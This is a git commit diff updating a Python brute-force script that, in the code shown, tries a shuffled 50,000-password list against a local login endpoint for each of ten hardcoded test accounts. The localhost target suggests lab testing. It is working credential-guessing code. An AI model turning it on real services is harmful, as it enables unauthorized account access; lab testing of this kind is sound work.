478f747c7d88a0f582083224233b6e5561837f26
Renana Solomon <renanasolomon2000@gmail.com>
2025-12-24 19:13:31 +0200

    update bf script file

--- attackScripts/bruteForce/bruteForce.py
+++ attackScripts/bruteForce/bruteForce.py
@@ -1,31 +1,39 @@
 import requests
 import time
+import json
+import random
 
 LOGIN_URL = "http://127.0.0.1:8000/login"
+PASSWORDS_FILE = "passwords_50k.json"
+SLEEP_SECONDS = 0.3
 
 test_vectors = {
-    "admin": {
-        "correct": "admin",
-        "wrong": ["12345", "password", "qwerty","admin1", "adm1n", "admi" ,"admn" ,"adnmi" ,"adnim" ,"aadmin" ,"aadmn" ,"admni" ]
-    },
-    "user": {
-        "correct": "12345",
-        "wrong": ["password", "qwerty", "usr", "user1", "usre", "uers", "use", "uuser", "uuserr", "userr"]
-    },
-    "john": {
-        "correct": "qwerty",
-        "wrong": ["12345", "password", "admin", "jhon", "johhn", "johnn", "joohn", "joh", "john1", "johny"]
-    },
-    "laura": {
-        "correct": "Summer2025",
-        "wrong": ["summer", "laura1", "laur", "lauraa", "luraa", "laaura", "laurab", "laurap", "summer2024", "Summer2024", "Summer2023"]
-    }
+    "user1": {"correct": "password"},
+    "user2": {"correct": "12345"},
+    "john": {"correct": "qwerty"},
+    "charlie": {"correct": "Password123"},
+    "oliver": {"correct": "HelloWorld!"},
+    "nina": {"correct": "NiNa1234"},
+    "linda": {"correct": "admin543210"},
+    "derek": {"correct": "13242553625735253716"},
+    "elena": {"correct": "daghGVAHGSVagsv1263562"},
+    "bruce": {"correct": "X$4M!eQ8@Zp*L"},
+    
 }
 
-for username, tv in test_vectors.items(): 
-    for pwd in tv["wrong"]:
-        requests.post(LOGIN_URL, data={"username": username, "password": pwd})
-        time.sleep(0.3)
+passwords = []
+with open(PASSWORDS_FILE, "r", encoding="utf-8") as f:
+    passwords = json.load(f)
 
-    requests.post(LOGIN_URL, data={"username": username, "password": tv["correct"]})
-    time.sleep(0.3)
+random.shuffle(passwords)
+
+for username, correct_password in test_vectors.items():
+    for pwd in passwords:
+        requests.post(
+            LOGIN_URL,
+            data={
+                "username": username,
+                "password": pwd
+            }
+        )
+        time.sleep(SLEEP_SECONDS)
